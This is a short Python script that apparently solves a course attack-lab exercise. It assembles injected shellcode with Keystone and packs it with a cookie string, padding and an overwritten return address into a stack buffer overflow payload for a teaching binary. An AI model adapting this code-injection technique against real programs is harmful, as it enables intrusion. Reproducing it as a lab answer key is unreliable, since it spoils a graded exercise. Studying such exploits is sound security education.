import sys

from keystone import KS_ARCH_X86, KS_MODE_64, KS_OPT_SYNTAX_ATT, Ks, KsError

assembly = """
movl $0x004018fa, (%esp)
movl $0x5561DC78, %edi
ret
"""

ks = Ks(KS_ARCH_X86, KS_MODE_64)
ks.syntax = KS_OPT_SYNTAX_ATT

try:
    encoding, count = ks.asm(assembly)
    assert encoding is not None
    asm_bytes = bytes(encoding)
except KsError as e:
    print(e)
    sys.exit(1)

cookie = b"59b997fa\x00"

padding = 40 - (len(asm_bytes) + len(cookie))
filler = b"a" * padding

return_to = 0x5561DCA0 - (40 - len(cookie))
return_to_bytes = return_to.to_bytes(8, byteorder="little")

payload = cookie + asm_bytes + filler + return_to_bytes

sys.stdout.buffer.write(payload)
